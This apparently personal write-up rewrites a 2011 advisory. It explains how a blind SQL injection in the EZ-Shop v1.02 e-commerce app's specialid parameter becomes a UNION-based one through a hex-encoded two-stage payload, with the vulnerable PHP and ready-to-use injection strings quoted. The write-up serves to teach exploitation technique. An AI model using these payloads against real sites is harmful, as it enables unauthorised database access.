## Turning a Blind SQLi into Union-based with a 2-in-1 Payload
### References
Exploit-DB Mirror: https://www.exploit-db.com/exploits/17170
 
Original discovery date: 14/04/2011
 
Vulnerable App: EZ-Shop v1.02
 
App Download link: https://www.exploit-db.com/apps/0cabe6f3b8ac243bc856e38f42e6baf1-ecommerce-installer-fc-1.0.2.zip
 
### Rationale
I thought of rewriting this advisory from 2011 because:
- It was poorly written
- I realised it was interesting and worth sharing

### Background
EZ-Shop ~~is~~ was prone to SQL Injection due to insufficient user-input sanitization.

The vulnerability could have just been exploited as a Boolean Blind SQL Injection, but why being so boring and unoriginal when with a bit of creativity we can do something way fancier, complicated and literally overkill it?

What follows is a writeup of how *being high* drove me to turn a Boolean Blind SQL Injection into a Union-Based SQL Injection using a *two-in-one* Payload. The 1st payload targeting the 1st vulnerable query and turning it into the carrier for the 2nd payload targeting the 2nd vulnerable query, which unlike the first query could be exploited via a Union-based SQL Injection.

### 1st SQL Injection 
Below follows the incriminated PHP code:

*specialoffer.php:249-283*
```php
<?php 
	$speid=$_REQUEST['specialid'];
	$sql="select * from tblprodgiftideas where intgiftideaid='$speid'";
	$resgid=$obj_db->select($sql);
	if(count($resgid)>0) {
		for($p=0;$p<count($resgid);$p++) {
			//echo $resgid[$p]['intprodid']."<br>";
			$prid=$resgid[$p]['intprodid'];
	 		$sql6="select * from tblproddesc where intid='$prid'";
	  		$resprname1=$obj_db->select($sql6);
	 		
	 		if(count($resprname1)>0) {
				$desc=$resprname1[0]['txtdesc'];
				$resprname1=$resprname1[0]['varprodname'];
	 		}
	 	 	else {
	 			$resprname1="";
	 		}

	  		$sql6="select * from tblproducts where intprodid='$prid'";
	 
	  		$resprname=$obj_db->select($sql6);
	  		if(count($resprname)>0) {
	  			$proprice=$resprname[0]['decprice'];
?>

<tr>
  <td width="50%"><table width="100%" height="170" border="0" cellpadding="0" cellspacing="1" bordercolor="#CCCCCC" class="proborder">
    <tr>
      <td height="25" colspan="2" class="fntstyle"> <?php echo $resprname1;?></td>
...snip...
```


The variable `$speid` takes user inputs through `$_REQUEST` (so, both GET and POST) and places it in the SQL query `$sql` (which from now on we will refer to as *query1*) without being sanitised:

```php
$speid=$_REQUEST['specialid'];
$sql="select * from tblprodgiftideas where intgiftideaid='$speid'";
```

As it will be shown, the results of this query do not get printed on screen, however, should the query return records the app would later on display other data coming from other SQL queries on screen - leaving this only exploitable as *Inferential* SQL Injection, more specifically, of the *Boolean Blind* kind.

### 2nd SQL Injection
By further looking into the code we can see that the results of *query1* get stored in the `$prid` parameter:

```php
$speid=$_REQUEST['specialid'];
$sql="select * from tblprodgiftideas where intgiftideaid='$speid'";
$resgid=$obj_db->select($sql);
if(count($resgid)>0)
{
	for($p=0;$p<count($resgid);$p++)
	{
		//echo $resgid[$p]['intprodid']."<br>";
		$prid=$resgid[$p]['intprodid']; // <---- prid
...snip...
```

The `$prid` parameter is then placed into a second query `$sql6` (which we will refer to as *query2*) again without proper input sanitisation:

```php
$sql6="select * from tblproducts where intprodid='$prid'";
```

Unlike *query1*, *query2* (`$sql6`) does actually print the results directly on screen through the `$resprname1` parameter - making it technically possible to exploit it via a *UNION-based SQL Injection*:

*somewhere towards the bottom of specialoffer.php*
```php
<?php echo $resprname1;?>
```

### The exploitation

To recap, this is what we know:
1. *query1* is vulnerable to SQL Injection (*Boolean Blind*)
2. *query1* results are placed without sanitisation in *query2*, effectively making *query2* also vulnerable
3. results from *query2* are directly displayed on the page, making *query2* exploitable as *Union-based*

At this point, *stoned me* thought (of course):
> what if we create a SQLi payload to "manipulate" the results of *query1* to turn them into a payload directed against *query2* so that we could exploit it as a nice-easy *Union-based* ? 


#### Payload to generate a Payload

To get a query to return arbitrary text we can use the MySQL `SELECT` statement followed by the *hexadecimal* representation of the string we want returned:

For instance:
```sql
select 0x69276d2074686520726573756c74206f662074686520717565727920796f75206a757374206578656375746564
```

Will yield the following output:
```
i'm the result of the query you just executed
```

**Important note**
Union queries **always** need to have the same amount of columns as the first query.

##### The complications .. 
*query1* queries the table `tblprodgiftideas` which has **3** columns:
`intid,intgiftideaid,intprodid`

*query2* instead queries the table `tblproddesc`, which has **5** columns:
`intid,intlanguageid,varprodname,txtdesc,intprodviewed`

The column (`intprodid`) - coming from the results of *query1* - is placed in *query2* and is the 3rd column in order of appearance according to the database schema for the `tblprodgiftideas` table:
```php
$prid=$resgid[$p]['intprodid'];
```

The column (`varprodname`) - result of *query2* - that gets printed on screen is again the 3rd column of the `tblproddesc` table:

```php
$resprname1=$resprname1[0]['varprodname'];
```

If we want both injections to work, we need to select 3 columns in the first payload, and 5 in the second, as the two queries were made to two different tables.

So how do we go about when we can only inject **1** parameter, and our payload has to:
1. inject the first query to get it to produce a payload for the 2nd query
2. at the same time, has the correct syntax and match the number of columns in the union statement on 2 different queries and 2 different tables 


#### Exploiting in reverse 
To better understand the flow of what will follow, I'll start from the end-goal (final injection) and reconstruct the steps required in reverse order. We will assume the goal of this exploit is 
to obtain the version of the database.

**Query 2**
To achieve that, the following would be the payload required to be injected in *query2*:

```mysql
' union select 1,2,@@version,4,5#
```

Should the `$prid` variable hold the above string as its value, *query2* would turn from this:
```php
$sql6="select * from tblproducts where intprodid='$prid'";
```

To this:
```mysql
select * from tblproducts where intprodid='' union select 1,2,@@version,4,5#'
```

This would be a correct query and would allow us to see the value of `@@version` on screen.
So, how do we manipulate *query1* so that it would produce `' union select 1,2,@@version,4,5#` as its output? *hexadecimal* ...

**Query 1**

```php
$sql="select * from tblprodgiftideas where intgiftideaid='$speid'";
```

We know it has 3 columns, the 3rd being our carrier for the payload above. As explained earlier, we will resort to converting the final payload in *hexadecimal* and place the resulting string in the 3rd column of the UNION select.

Payload | hex(Payload)
--- | ---
`' union select 1,2,@@version,4,5#` | `2720756e696f6e2073656c65637420312c322c404076657273696f6e2c342c3523`

Injecting the following into `$speid` via the `specialid` GET/POST parameter:

```mysql
' union select 1,2,0x2720756e696f6e2073656c65637420312c322c404076657273696f6e2c342c3523#
```
Would turn `$sql` to the following:
```mysql
select * from tblprodgiftideas where intgiftideaid='' union select 1,2,0x2720756e696f6e2073656c65637420312c322c404076657273696f6e2c342c3523#'
```

#### Recap

Once executed by the interpreter the query will return the following string (row): `' union select 1,2,@@version,4,5#`

This string will get stored in the `$prid` variable, making *query2* to execute the following query:

`select * from tblproducts where intprodid='' union select 1,2,@@version,4,5#'`

The value of the 3rd column (`@@version`) in the UNION injection will then get stored in the `$resprname1` parameter and displayed on screen.

### Conclusion

We have just transformed a Boolean Blind SQL Injection into a Union-based SQL injection by crafting a 2-in-1 payload which used the results from the first injected query as the actual final payload for the 2nd query. 

**A note**
 
If you figured and noticed a difference in the exploitation as explained in this walkthrough compared to the original advisory, well you noticed well.
 
When I went to reproduce and re-read my original thinking I couldn't make sense why I ended up to overly complicate my life (the  `concat` to further split the payloads by commenting out bits from the 1st query) on the assumption that *I could not directly inject the 2nd payload in the 1st query via its hexadecimal representation - because - it simply could not work*.
After lots of thinking, I still can't make sense of it, at the end it was over 12 years ago and when I wrote the advisory I was more stoned than a rock. Funny still, it worked even with the extra unrequired complications. 
Initially I thought to explain this exploit the way it was originally done - however I realised it made no sense to confuse people without a real need for it, hence the modified version here.







